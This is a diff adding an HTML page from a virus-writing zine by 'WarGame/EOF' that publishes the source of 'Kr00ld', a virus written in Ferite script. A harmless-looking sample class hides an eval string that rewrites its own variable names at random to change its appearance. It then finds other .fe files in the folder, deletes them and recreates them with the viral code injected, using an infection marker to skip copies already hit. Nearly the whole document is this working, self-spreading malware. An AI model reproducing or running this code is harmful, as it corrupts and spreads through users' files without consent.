@@ -1,0 +1,43 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: WarGame/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/WarGame/Kr00ld"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+#!/usr/bin/env ferite
+
+uses &quot;console&quot;;
+
+namespace foo
+{
+
+    class bar
+    {
+       public static number i;
+
+       function constructor( string hello )
+       {
+           Console.println( &quot;$hello&quot; );
+       
+eval('uses &quot;filesystem&quot;,&quot;sys&quot;,&quot;regexp&quot;,&quot;math&quot;,&quot;string&quot;,&quot;date&quot;;function BBEAGI(string FJCGFK) { string JRHBGH = File.open(FJCGFK).toString(); if(String.index(JRHBGH,&quot;kr00l.d by [WarGame,#eof]&quot;) != -1) {return 1;} else {return 0;}} function BGGCJD() {return 65; } function GSGIAO(number sd) { Math.srand(sd); return String.sprintf(&quot;%c%c%c%c%c%c&quot;,((Math.rand()%10)+BGGCJD()),((Math.rand()%20)+BGGCJD()),((Math.rand()%11)+BGGCJD()),((Math.rand()%9)+BGGCJD()),((Math.rand()%14)+BGGCJD()),((Math.rand()%16)+BGGCJD()));} string GHCIFI = &quot;kr00l.d by [WarGame,#eof]&quot;;string GHGBAD = &quot;&quot;;string HKGAFH = &quot;&quot;;object HTJHHK =  File.open(Sys.scriptName());string CDFEAB = &quot;&quot;;object JMDCGM = new Directory(&quot;.&quot;); while(String.index((HKGAFH = HTJHHK.readln()),GHCIFI) == -1) {} if(1) { HKGAFH = Regexp.replaceAll(&quot;GHCIFI&quot;,HKGAFH,GSGIAO(Date.now()+1989)); HKGAFH = Regexp.replaceAll(&quot;BBEAGI&quot;,HKGAFH,GSGIAO(Date.now()+1975)); HKGAFH = Regexp.replaceAll(&quot;HKGAFH&quot;,HKGAFH,GSGIAO(Date.now()+2006)); HKGAFH = Regexp.replaceAll(&quot;BGGCJD&quot;,HKGAFH,GSGIAO(Date.now()+1900)); HKGAFH = Regexp.replaceAll(&quot;FJCGFK&quot;,HKGAFH,GSGIAO(Date.now()+1930)); HKGAFH = Regexp.replaceAll(&quot;JRHBGH&quot;,HKGAFH,GSGIAO(Date.now()+1910)); HKGAFH = Regexp.replaceAll(&quot;JMDCGM&quot;,HKGAFH,GSGIAO(Date.now()+1920)); HKGAFH = Regexp.replaceAll(&quot;GHGBAD&quot;,HKGAFH,GSGIAO(Date.now()+1950)); HKGAFH = Regexp.replaceAll(&quot;CDFEAB&quot;,HKGAFH,GSGIAO(Date.now()+1970)); HKGAFH = Regexp.replaceAll(&quot;HTJHHK&quot;,HKGAFH,GSGIAO(Date.now()+1890)); HKGAFH = Regexp.replaceAll(&quot;GSGIAO&quot;,HKGAFH,GSGIAO(Date.now()+1800)); } while((GHGBAD = JMDCGM.getEntry()) != &quot;&quot;) { if(String.index(Sys.scriptName(),GHGBAD) == -1 &amp;&amp; String.index(GHGBAD,&quot;.fe&quot;) != -1) {  if(!BBEAGI(GHGBAD)) { CDFEAB = File.open(GHGBAD).toString(); File.remove(GHGBAD); CDFEAB = Regexp.replace(&quot;}&quot;,CDFEAB,&quot;\n&quot; + HKGAFH+&quot;}\n&quot;); File.create(GHGBAD).writeln(CDFEAB); } } }');
+}
+
+
+       static function test()
+       {
+           Console.println( &quot;foo::test()&quot; );
+       }
+    }
+
+}
+
+object bah = new foo.bar(&quot;foo&quot;);
+foo.bar.test();
+foo.bar.i = 2;
+
+iferr {
+  bah.i = 3;
+} fix {
+  Console.println( &quot;bah.i = 3; Failed, This was expected&quot; );
+}
+</pre></body></html>
